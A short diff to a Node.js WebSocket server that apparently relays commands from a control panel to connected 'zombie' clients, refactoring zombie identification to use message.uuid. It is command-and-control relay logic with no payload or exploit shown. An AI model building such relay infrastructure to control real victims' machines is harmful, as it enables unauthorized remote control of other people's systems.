@@ -34,17 +34,15 @@ webSocketServer.on('connection', function(ws) {
                     console.error('ERROR', 'Control panel WebSocket is not open. Cannot forward: %s', message);
                     return;
                 }
-                let zombieId = getZombieId(message);
-                zombies[zombieId] = ws;
-                console.log('New zombie:', zombieId);
+                zombies[message.uuid] = ws;
+                console.log('New zombie:', message.uuid);
                 controlPanelWs.send(data);
                 break;
             }
             case 'zombie-cmd': {
-                let zombieId = getZombieId(message);
-                let destinationWs = zombies[zombieId];
+                let destinationWs = zombies[message.uuid];
                 if(!destinationWs){
-                    console.error('ERROR', 'Zombie Websocket with given id was not found', zombieId);
+                    console.error('ERROR', 'Zombie Websocket with given id was not found', message.uuid);
                     return;
                 }
                 if (destinationWs.readyState !== WebSocket.OPEN) {
